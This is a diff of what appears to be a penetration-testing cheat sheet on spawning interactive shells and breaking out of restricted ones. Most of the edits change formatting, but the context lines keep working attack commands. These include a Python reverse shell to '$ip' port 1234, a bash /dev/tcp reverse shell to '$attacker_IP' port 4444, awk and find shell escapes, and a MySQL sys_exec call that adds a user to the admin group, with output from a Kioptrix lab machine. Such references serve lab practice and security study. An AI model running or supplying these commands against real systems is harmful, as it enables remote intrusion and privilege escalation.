@@ -1,7 +1,7 @@
-**Spawning a TTY Shell - Break out of Jail or limited shell**
-
-####PYTHON
+Spawning a TTY Shell - Break out of Jail or limited shell
 -----
+**PYTHON**
+
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
@@ -11,8 +11,8 @@ python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 Plesse check below:
 PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
-####BASH
------
+**BASH**
+
 bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
 echo os.system('/bin/bash')
 OR        
@@ -53,7 +53,7 @@ find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 -----
 
 echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
------
+
  == Files Executed in Unrestricted Mode? ==
 
 ----- 
@@ -74,7 +74,7 @@ select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then 
 First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
 john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
 -rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
- -----
+
 
 **== Upgrading half shells to fully interactive TTYs without closing nc session. ==**
  -----
@@ -218,7 +218,6 @@ If yes, then simply copy commands into the PATH that have known shell escapes. O
    - copy files to your home directory and try to execute.
    -- if not able to copy, mount devices or filesystems
    -- copy using SCP, FTP, rsync
- ----- 
+
 Find other writable directories and upload your script there.
------
 Create a symbolic link in a directory where you have write access.
